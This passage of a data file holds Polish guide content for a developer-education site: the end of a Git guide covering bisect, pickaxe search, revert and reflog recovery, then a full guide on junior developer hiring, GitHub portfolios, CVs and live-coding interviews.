          'Kiedy w projekcie liczącym kilkaset commitów pojawia się regresja — na przykład kalkulator cen działał poprawnie dwa tygodnie temu, a dziś zwraca błędną stawkę podatku — nie musisz ręcznie przeglądać dziesiątek plików. Polecenie git bisect wykorzystuje wyszukiwanie binarne w historii commitów: wskazujesz ostatni znany dobry commit oraz obecny uszkodzony, a Git automatycznie podsuwa środkowe punkty historii. W repozytorium z tysiącem commitów znajdujesz dokładnie jeden winny commit w maksymalnie dziesięciu krokach — a jeśli podepniesz skrypt testowy (git bisect run npm test), Git znajdzie winowajcę całkowicie automatycznie.',
          'Równie przydatne jest polecenie git log -S "nazwaFunkcji" (tzw. pickaxe), które pokazuje wszystkie commity dodające lub usuwające konkretny fragment kodu, oraz git blame -L 20,45 plik.ts wyjaśniające kontekst powstania konkretnych linii. Dzięki dobrym opisom commitów i małym Pull Requestom zamiast szukać „kto zepsuł”, w kilka sekund rozumiesz powód biznesowy stojący za danym warunkiem w kodzie.',
        ],
      },
    ],
    keyTakeaways: [
      'Traktuj gałąź main jako zawsze gotową do produkcji; całą nową pracę prowadź na krótkich gałęziach funkcjonalnych.',
      'Pisz małe, atomowe commity z jasnym opisem „dlaczego” oraz konwencją Conventional Commits.',
      'Do cofania zmian opublikowanych na wspólnej gałęzi zawsze używaj git revert zamiast git reset --hard.',
      'Dobre Code Review zaczyna się od małego Pull Requestu (do ~350 linii), jasnego opisu i własnego self-review.',
    ],
    faq: [
      {
        question: 'Czy mogę usunąć przypadkowo wpisane hasło z historii Gita samym nowym commitem?',
        answer: 'Nie! Usunięcie hasła w kolejnym commicie pozostawia je w pełni widoczne w poprzednich commitach w historii repozytorium. Jeśli sekret kiedykolwiek trafił na zdalne repozytorium (zwłaszcza publiczne), należy natychmiast zrotować (unieważnić i wygenerować nowy) klucz lub hasło, a dopiero potem czyścić historię.',
      },
      {
        question: 'Czym różni się git push --force-with-lease od git push --force?',
        answer: 'Zwykłe --force bezwarunkowo nadpisuje zdalną gałąź, ryzykując skasowanie cudzych commitów. Flaga --force-with-lease sprawdza najpierw, czy nikt w międzyczasie nie dopisał nowych zmian na serwerze — jeśli dopisał, bezpiecznie przerywa operację.',
      },
      {
        question: 'Co zrobić, gdy przypadkiem wykonałem git reset --hard i straciłem lokalny commit?',
        answer: 'Wpisz git reflog — Git zapisuje wszystkie ostatnie pozycje HEAD przez minimum 30 dni. Znajdź hash utraconego commitu na liście i przywróć go poleceniem git switch -c odzyskany <hash>.',
      },
    ],
    relatedLessonIds: ['git-1', 'git-2', 'git-3', 'git-4', 'git-5'],
    relatedGuideSlugs: [
      'docker-cicd-wdrozenie-aplikacji-na-produkcje',
      'jak-zostac-full-stack-developerem-plan-nauki',
      'rekrutacja-it-i-portfolio-github-przewodnik-juniora',
    ],
  },
  {
    slug: 'rekrutacja-it-i-portfolio-github-przewodnik-juniora',
    title: 'Rekrutacja IT i portfolio na GitHubie: jak zbudować profil Junior Full Stack Developera, który zdobywa zaproszenia',
    titleEn: 'IT Hiring & GitHub Portfolio: Building a Junior Full Stack Developer Profile That Wins Interviews',
    subtitle: 'Co rekruter i Team Lead naprawdę sprawdzają w pierwszych 60 sekundach na Twoim GitHubie i CV, jakie projekty wyróżniają Cię z tłumu oraz jak przygotować się do rozmowy Live Coding.',
    subtitleEn: 'What recruiters and Tech Leads check in the first 60 seconds on your GitHub and CV, standout portfolio projects, and Live Coding interview prep.',
    metaDescription: 'Praktyczny przewodnik rekrutacji IT dla Junior Full Stack Developera: projektowanie wyróżniającego się portfolio na GitHubie, CV przyjazne systemom ATS i rozmowa techniczna.',
    category: 'Ścieżka Kariery',
    categoryEn: 'Career Path',
    publishedAt: '2026-11-26',
    updatedAt: '2026-11-28',
    authorName: 'Zespół Redakcyjny Full Stack Developer Academy',
    authorRole: 'Tech Career & Engineering Mentorship',
    level: 'Początkujący',
    levelEn: 'Beginner',
    leadParagraphs: [
      'Rynek stanowisk juniorskich w branży IT jest wymagający, ale nie jest zamknięty. Firmy nadal zatrudniają osoby bez wieloletniego stażu komercyjnego — przestały jednak zapraszać na rozmowy kandydatów, których całe portfolio składa się z pustego profilu GitHub, wygenerowanego kalkulatora i aplikacji pogody przepisanej z kursu na YouTube. Z punktu widzenia zespołu rekrutującego liczy się jeden sygnał: czy ta osoba potrafi samodzielnie dowieźć realną funkcję od wymagań aż po działający, przetestowany kod?',
      'Dobra wiadomość jest taka, że zdecydowana większość kandydatów wciąż popełnia te same proste błędy prezentacyjne: brak działającego linku demo, brak pliku README, niesformatowany kod oraz CV pełne nic niemówiących pasków procentowych typu „JavaScript 80%”. Naprawienie tych elementów oraz zbudowanie dwóch solidnych projektów domenowych stawia Cię od razu w górnych kilku procentach aplikacji.',
    ],
    sections: [
      {
        id: 'pierwsze-60-sekund-na-githubie',
        heading: 'Co Team Lead sprawdza w pierwszych 60 sekundach na Twoim GitHubie',
        paragraphs: [
          'Osoba techniczna przeglądająca trzydzieści aplikacji dziennie nie ma godziny na instalowanie Twojego projektu lokalnie, konfigurowanie bazy danych i domyślanie się haseł testowych. W pierwszej minucie sprawdza cztery konkretne rzeczy: przypięte (pinned) 2–4 najważniejsze repozytoria na górze profilu, jakość pliku README ze zrzutami ekranu i linkiem do działającego demo online, czystość struktury katalogów (rozdzielenie komponentów, serwisów i testów) oraz naturalną historię commitów pokazującą jak rozwijasz projekt krok po kroku.',
          'Jeśli projekt wymaga logowania, dodaj na stronie logowania jawny przycisk szybkiego konta demonstracyjnego albo opis konta testowego w README. Rekruter nie będzie zakładał nowego konta na prywatny e-mail tylko po to, żeby zobaczyć Twój dashboard.',
        ],
        table: {
          caption: 'Projekt szablonowy kontra projekt portfolio, który przekonuje rekruterów',
          headers: ['Cecha projektu', 'Słaby klon z tutorialu', 'Mocny projekt portfolio Full Stack'],
          rows: [
            ['Tematyka', 'Aplikacja To-Do, kalkulator, klon Netflixa bez backendu', 'Realny problem: system rezerwacji, budżet, CRM, platforma nauki'],
            ['Architektura', 'Wszystko w jednym pliku, brak walidacji, dane w tablicy JS', 'Frontend + REST API + baza danych + uwierzytelnianie + testy'],
            ['Dokumentacja README', 'Domyślny plik Create React App / Vite', 'Cel biznesowy, demo URL, zrzuty ekranu, architektura, instrukcja uruchomienia'],
            ['Jakość inżynierska', 'Brak testów, błędy w konsoli, brak responsywności', 'TypeScript strict, testy jednostkowe, obsługa błędów i mobile RWD'],
          ],
        },
      },
      {
        id: 'cv-techniczne-przyjazne-ats',
        heading: 'Techniczne CV przyjazne systemom ATS i konkretnym rekruterom',
        paragraphs: [
          'Twoje CV powinno zmieścić się na jednej przejrzystej stronie A4 (chyba że masz już wieloletnie doświadczenie inżynierskie) w formacie PDF z zaznaczalnym tekstem — unikaj ciężkich, wielokolumnowych grafik z Canvy pełnych ikon i gwiazdek oceny umiejętności. Napis „React 4/5” albo „SQL 70%” nic nie znaczy dla rekrutera, ponieważ nikt nie zna Twojej skali odniesienia.',
          'Zamiast ocen procentowych pokaż konkretne dowody użycia technologii w opisie projektów według prostej formuły: Co zbudowałeś + Jakie technologie zastosowałeś + Jaki problem techniczny rozwiązałeś. Przykładowo zamiast pisać „Aplikacja webowa w React”, napisz: „Zbudowałem system zarządzania budżetem w React 19, TypeScript, Node.js i PostgreSQL z paginacją kursorową, walidacją formularzy, eksportem raportów CSV oraz 24 testami jednostkowymi uruchamianymi w GitHub Actions”.',
        ],
      },
      {
        id: 'rozmowa-techniczna-i-live-coding',
        heading: 'Jak przejść rozmowę techniczną i Live Coding bez paraliżu stresowego',
        paragraphs: [
          'Największy mit na temat zadań Live Coding brzmi: musisz napisać bezbłędne rozwiązanie w kompletnej ciszy w pięć minut. W rzeczywistości rekruterzy znacznie wyżej oceniają kandydata, który głośno komunikuje swój tok myślenia, dopytuje o przypadki brzegowe (np. „Czy tablica wejściowa może być pusta? Czy zwracamy nową tablicę bez mutowania oryginału?”), najpierw zapisuje proste, działające rozwiązanie, a dopiero potem analizuje jego złożoność i proponuje usprawnienie.',
          'Przed rozmową przygotuj trzyminutową, konkretną opowieść o swoim flagowym projekcie: z jakiego najtrudniejszego błędu wyszedłeś, jaką decyzję architektoniczną podjąłbyś dziś inaczej i jak zabezpieczyłeś aplikację przed typowymi atakami. Bądź gotowy na podstawowe, ale bardzo częste pytania przekrojowe: cykl żądania HTTP od wpisania adresu do wyrenderowania strony, różnicę między autentykacją a autoryzacją, działanie Event Loop, zasady React state oraz proste zapytanie SQL z JOIN i GROUP BY.',
        ],
        bulletPoints: [
          'Przypnij na profilu GitHub 2–4 najlepsze repozytoria, a stare wprawki i nieukończone eksperymenty przestaw na prywatne.',
          'Każdy główny projekt wyposaż w działający link demo, czytelne README ze zrzutami ekranu i automatyczny workflow CI.',
          'Usuń z CV paski procentowe i gwiazdki umiejętności — zastąp je konkretnymi technologiami użytymi w zrealizowanych projektach.',
          'Podczas Live Codingu głośno myśl, sprawdzaj przypadki brzegowe i nie bój się przyznać, czego nie wiesz, proponując jak byś to sprawdził w dokumentacji.',
        ],
      },
      {
        id: 'strategia-aplikowania-i-pierwsze-90-dni',
        heading: 'Strategia aplikowania bez wypalenia i checklista przed wysłaniem CV',
        paragraphs: [
          'Masowe wysyłanie identycznego CV na sto losowych ogłoszeń dziennie rzadko przynosi efekty i bardzo szybko prowadzi do frustracji. Zdecydowanie skuteczniejsza jest strategia jakościowa: wybierz piętnaście firm tygodniowo, których technologia i produkt rzeczywiście pasują do Twojego stacku (na przykład TypeScript, React, Node.js, PostgreSQL), dostosuj sekcję podsumowania zawodowego w CV do kluczowych słów z ogłoszenia oraz dołącz krótką, konkretną wiadomość wskazującą jeden projekt z Twojego GitHuba, który najlepiej odpowiada profilowi tej firmy.',
          'Przed wysłaniem pierwszej aplikacji wykonaj końcowy audyt własnej wizytówki w sieci: otwórz wszystkie linki z CV w oknie incognito (upewnij się, że demo nie zasypia z błędem 500 i nie wymaga klucza z lokalnego .env), sprawdź profil LinkedIn pod kątem spójności z CV oraz poproś zaprzyjaźnionego programistę o dziesięciominutowy przegląd Twojego flagowego repozytorium. Nawet jedno szczere spojrzenie z zewnątrz pozwala wychwycić drobne usterki, które na rozmowie zrobiłyby złe pierwsze wrażenie.',
        ],
      },
    ],
    keyTakeaways: [
      'Dwa dopracowane, wdrożone projekty Full Stack z dobrym README, testami i działającym demo biją na głowę dwadzieścia klonów z kursów.',
      'CV powinno być jednokolumnowym, czystym dokumentem PDF bez gwiazdek procentowych, skupionym na konkretnych osiągnięciach technicznych.',
      'Podczas rozmowy Live Coding kluczowa jest komunikacja, analiza przypadków brzegowych i metodyczne debugowanie, a nie idealna pamięć składni.',
      'Umiejętność rzetelnego opowiedzenia o własnych decyzjach architektonicznych (SQL, bezpieczeństwo, stan aplikacji) buduje zaufanie zespołu.',
    ],
    faq: [
      {
        question: 'Czy mogę wpisać własne, rozbudowane projekty Full Stack w sekcji doświadczenia lub projektów w CV?',
        answer: 'Tak — utwórz wyraźną, główną sekcję „Wybrane projekty inżynierskie” zaraz pod podsumowaniem i opisz w niej 2–3 projekty tak rzetelnie jak projekty komercyjne (architektura, stack, rozwiązane problemy, link do demo i kodu). Nie przedstawiaj jednak projektów prywatnych jako zatrudnienia w nieistniejącej firmie.',
      },
      {
        question: 'Czy rekruterzy sprawdzają zielone kwadraciki aktywności na GitHubie?',
        answer: 'Zdecydowanie ważniejsza od sztucznego nabijania codziennych commitów jest jakość kodu w przypiętych repozytoriach. Regularna, autentyczna historia commitów przez kilka miesięcy jest jednak bardzo pozytywnym sygnałem systematyczności.',
      },
      {
        question: 'W jakim języku lepiej napisać CV i kod w portfolio — po polsku czy po angielsku?',
        answer: 'Kod źródłowy (nazwy zmiennych, funkcji, tabel, commity) zawsze pisz po angielsku — to światowy standard branży. CV przygotuj w języku ogłoszenia o pracę (dla większości firm technologicznych i software house’ów w Polsce angielski jest preferowany lub wymagany).',
      },
    ],
    relatedLessonIds: ['career-1', 'career-2', 'career-3', 'git-5'],
    relatedGuideSlugs: [
      'jak-zostac-full-stack-developerem-plan-nauki',
      'git-i-code-review-praca-zespolowa-w-projektach-it',
      'testowanie-oprogramowania-piramida-testow-node-playwright',
    ],
  },
];
